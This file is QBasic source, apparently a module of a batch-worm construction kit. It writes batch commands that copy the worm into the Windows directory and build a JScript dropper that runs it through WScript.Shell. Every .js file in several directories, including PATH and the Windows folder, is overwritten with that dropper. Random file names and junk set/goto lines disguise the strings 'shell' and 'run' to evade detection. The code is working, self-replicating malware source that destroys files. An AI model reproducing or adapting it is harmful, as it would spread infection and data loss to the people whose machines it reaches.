CLS
OPEN "worm.txt" FOR APPEND AS #1
OPEN "poly.bwg" FOR INPUT AS #2
poly$ = INPUT$(1, #2)
CLOSE #2
IF poly$ = "N" THEN GOTO nopoly
BB$ = ""
CC$ = ""
DD$ = ""
BB$ = " % BBBB %"
CC$ = " % CCCC %"
DD$ = " % DDDD %"
nopoly:
OPEN "JS.bwg" FOR INPUT AS #2
JS$ = INPUT$(2, #2)
CLOSE #2
IF JS$ = "NS" THEN GOTO noJS

ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
b$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
jsdropname$ = a$ + b$ + c$ + d$ + e$ + ".js"


ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
b$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
jsvirname$ = a$ + b$ + c$ + d$ + e$ + ".bat"
PRINT #1, "copy %MyS% %windir%\"; jsvirname$; BB$
PRINT #1, "echo { >> %windir%\"; jsdropname$; BB$
PRINT #1, "echo shell=WScript.CreateObject("; CHR$(34); "WScript.Shell"; CHR$(34); "); >> %windir%\"; jsdropname$; BB$
lala = INT(RND * 3) + 1

IF lala = 1 THEN PRINT #1, "set jsda=a"
IF lala = 1 THEN PRINT #1, "set jsda=r"
IF lala = 1 THEN PRINT #1, "goto jsda"
IF lala = 1 THEN PRINT #1, "set jsda=h"
IF lala = 1 THEN PRINT #1, ":jsda"
IF lala = 1 THEN PRINT #1, "set jsdb=w"
IF lala = 1 THEN PRINT #1, "set jsdb=n"
IF lala = 1 THEN PRINT #1, "goto jsdb"
IF lala = 1 THEN PRINT #1, "set jsd=k"
IF lala = 1 THEN PRINT #1, ":jsdb"
IF lala = 1 THEN run$ = "%jsda%u%jsdb%"

IF lala = 2 THEN PRINT #1, "set jsda=o"
IF lala = 2 THEN PRINT #1, "set jsda=n"
IF lala = 2 THEN PRINT #1, "goto jsda"
IF lala = 2 THEN PRINT #1, "set jsda=i"
IF lala = 2 THEN PRINT #1, ":jsda"
IF lala = 2 THEN PRINT #1, "set jsdb=k"
IF lala = 2 THEN PRINT #1, "set jsdb=u"
IF lala = 2 THEN PRINT #1, "goto jsdb"
IF lala = 2 THEN PRINT #1, "set jsd=q"
IF lala = 2 THEN PRINT #1, ":jsdb"
IF lala = 2 THEN run$ = "r%jsdb%%jsda%"

IF lala = 3 THEN PRINT #1, "set jsda=p"
IF lala = 3 THEN PRINT #1, "set jsda=u"
IF lala = 3 THEN PRINT #1, "goto jsda"
IF lala = 3 THEN PRINT #1, "set jsda=z"
IF lala = 3 THEN PRINT #1, ":jsda"
IF lala = 3 THEN PRINT #1, "set jsdb=w"
IF lala = 3 THEN PRINT #1, "set jsdb=r"
IF lala = 3 THEN PRINT #1, "goto jsdb"
IF lala = 3 THEN PRINT #1, "set jsd=x"
IF lala = 3 THEN PRINT #1, ":jsdb"
IF lala = 3 THEN run$ = "%jsdb%%jsda%n"

PRINT #1, "set jsdd=dfg"
PRINT #1, "set jsdd=ll"
PRINT #1, "goto jsdd"
PRINT #1, "set jsdd=q34nvc"
PRINT #1, ":jsdd"


PRINT #1, "set jsdc=asda"
PRINT #1, "set jsdc=she"
PRINT #1, "goto jsdc"
PRINT #1, "set jsdc=fdgew"
PRINT #1, ":jsdc"

PRINT #1, "echo %jsdc%%jsdd%."; run$; "("; CHR$(34); "%windir%\"; jsvirname$; CHR$(34); "); >> %windir%\"; jsdropname$; BB$
PRINT #1, "set jsda="
PRINT #1, "set jsdb="
PRINT #1, "set jsdc="
PRINT #1, "set jsdd="
PRINT #1, "echo } >> %windir%\"; jsdropname$; BB$
PRINT #1, "set jsda=asf"
PRINT #1, "set jsda=for"
PRINT #1, "goto jsde"
PRINT #1, "set jsda=spth"
PRINT #1, ":jsde"
PRINT #1, "%jsde% %%j in (*.js \*.js ..\*.js %path%\*.js %windir%\*.js) do copy "; jsdropname$; " %%j"; BB$
PRINT #1, "del %windir%\"; jsdropname$; BB$
noJS:
CLOSE #1
KILL "JS.bwg"
KILL "poly.bwg"

